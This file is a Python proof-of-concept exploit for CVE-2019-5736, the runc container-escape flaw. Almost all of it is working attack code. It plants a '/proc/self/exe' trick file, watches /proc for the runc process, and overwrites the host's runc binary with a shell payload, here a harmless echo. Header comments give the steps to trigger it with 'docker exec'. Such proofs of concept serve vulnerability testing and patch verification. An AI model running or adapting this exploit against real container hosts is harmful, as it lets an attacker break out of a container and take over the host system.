#!/bin/python3
# PoC for CVE-2019-5736 in Python by @singe (with help from @_staaldraad, @frichette_n & @_cablethief)
# Target will need a python3 interpreter
# Run this python file in the container
# Then from the host: docker exec -i <container name> /tmp/evil
#It may be needed to install libseccomp2 and libapparmor1 in container
import os
import stat

payload='#!/bin/bash\necho Success!\n'
target_file='/tmp/evil'

def cve_2019_5736():
  try:
    with open(target_file,'w') as evil:
      evil.write('#!/proc/self/exe --criu')
      os.chmod(target_file,stat.S_IXOTH)
  except FileNotFoundError:
      print('Error while opening /tmp/evil')
      return
  except PermissionError:
      print("Permission Error for /tmp/evil")
      return
  found = 0
  print("Waiting for the 'docker exec' command on host\n")
  while found == 0:
    procs = os.popen('ps -A -o pid')
    for pid in procs:
      pid = pid.strip()
      if pid == 'PID': continue
      if int(pid) > os.getpid():
        try:
          with open(f'/proc/{pid}/cmdline','r') as cmdline:
            if cmdline.read().find('runc') >= 0:
              print("runc's PID was founded")
              found = pid
        except FileNotFoundError:
            continue
        except ProcessLookupError:
          print("Error while opening /proc/<runc-pid>/cmdline")
          return
  handle = -1
  while handle == -1:
    try:
      handle = os.open(f'/proc/{found}/exe', os.O_PATH) #/proc/xxx/exe is fd to runcinit
    except FileNotFoundError:
      print("Error: file not found/")
      return
    except PermissionError:
      print("It's impossible to overwrite runc\nHost is invulnerable for cve 2019-5736")
      return

    print('Got file handle')
    write_handle = 0;
    while write_handle == 0:
      try:
        write_handle = os.open(f'/proc/self/fd/{str(handle)}',os.O_WRONLY|os.O_TRUNC)
      except OSError:
        print("OSError")
        return
    print('Got write handle')
    result = os.write(write_handle,str.encode(payload))
    if result == len(payload):
      print('Successfully wrote payload. Check if it executed.')
    else:
      print('Could not write')

cve_2019_5736()
